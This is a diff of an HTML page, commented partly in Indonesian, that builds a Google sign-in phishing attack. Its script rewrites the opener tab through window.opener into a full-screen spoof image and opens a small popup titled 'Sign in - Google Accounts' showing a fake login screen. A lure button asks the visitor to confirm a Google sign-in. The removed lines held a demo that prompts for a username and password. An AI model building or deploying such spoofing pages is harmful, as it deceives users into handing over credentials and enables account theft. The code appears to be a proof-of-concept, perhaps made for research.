@@ -12,89 +12,93 @@
         }
     </style>
 
-    <script>
-        function spoof() {
-            // HTML untuk halaman opener (full-screen)
-            const openerHTML = `
-                <html>
-                <head>
-                    <style>
-                        body { margin: 0; padding: 0; }
-                        #content { width: 100%; height: 100%; }
-                    </style>
-                </head>
-                <body>
-                    <img id="content" src="spoof.png">
-                </body>
-                </html>
-            `;
+<script>
+function spoof() {
 
-            // HTML untuk popup phishing login
-            const popupHTML = `
-                <html>
-                <head>
-                    <title>Sign in - Google Accounts</title>
-                    <style>
-                        body { margin: 0; padding: 0; }
-                        #content { width: 100%; height: 100%; }
-                    </style>
-                </head>
-                <body>
-                    <img id="content" src="sign.png">
-                </body>
-                </html>
-            `;
+    const openerHTML = `
+        <html>
+            <head>
+                <style>
+                    body {
+                        margin: 0;
+                        padding: 0;
+                        overflow: hidden;
+                    }
+                    #content {
+                        width: 100%;
+                        height: 100%;
+                        display: block;
+                    }
+                </style>
+            </head>
+            <body>
+                <img id="content" src="spoof.png">
+            </body>
+        </html>
+    `;
 
-            // ============ POPUP SPOOF =============
-            let win = window.open("https://www.google.com/", "_blank");
+    const popupHTML = `
+        <html>
+            <head>
+                <title>Sign in - Google Accounts</title>
+                <style>
+                    body {
+                        margin: 0;
+                        padding: 0;
+                        overflow: hidden;
+                    }
+                    #content {
+                        width: 100%;
+                        height: 100%;
+                        display: block;
+                    }
+                </style>
+            </head>
+            <body>
+                <img id="content" src="sign.png">
+            </body>
+        </html>
+    `;
 
-            setTimeout(() => {
-                try {
-                    win.document.write(`
-                        <h1>This is not Google!</h1>
-                        <button onclick="
-                            let username = prompt('Enter your username');
-                            let password = prompt('Enter your password');
-                            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-                        ">Click me</button>
-                    `);
-                    win.document.close();
-                } catch (e) {
-                    console.warn("Browser blocked write():", e);
-                }
-            }, 50);
+    // ---- FULLSCREEN FALLBACK ----
+    if (window.opener && window.opener.document.documentElement.requestFullscreen) {
+        window.opener.document.documentElement.requestFullscreen().catch(()=>{});
+    }
 
-            // ============ OVERWRITE OPENER ============
-            try {
-                window.opener.document.documentElement.webkitRequestFullscreen();
-                window.opener.document.write(openerHTML);
-            } catch (e) {
-                console.warn("Opener blocked:", e);
-            }
+    // ---- SPOOF MAIN WINDOW ----
+    if (window.opener) {
+        window.opener.document.open();
+        window.opener.document.write(openerHTML);
+        window.opener.document.close();
+    }
 
-            // ============ POPUP LOGIN PALSU =============
-            let width = 500, height = 460;
-            let left = (screen.width / 2) - (width / 2);
-            let popup = window.open("about:blank", "second",
-                `width=${width},height=${height},top=0,left=${left}`);
+    // ---- OPEN POPUP ----
+    const width = 500, height = 460;
+    const left = (screen.width / 2) - (width / 2);
 
-            try {
-                popup.document.write(popupHTML);
-                popup.document.close();
-            } catch (e) {
-                console.warn("Popup blocked:", e);
-            }
+    const win = window.open(
+        "about:blank",
+        "second",
+        `width=${width},height=${height},top=0,left=${left}`
+    );
 
-            window.close();
-        }
-    </script>
+    if (win) {
+        win.document.open();
+        win.document.write(popupHTML);
+        win.document.close();
+    }
+
+    // ---- CLOSE CURRENT WINDOW ----
+    window.close();
+}
+</script>
 </head>
 
 <body>
     <center>
         <br>
         <h1>
-            Please confirm you want to signin into your Google Account<br><br>
+            Please confirm you want to sign in into your Google Account<br><br>
             <button id="button" onclick="spoof();">Confirm</button>
         </h1>
     </center>
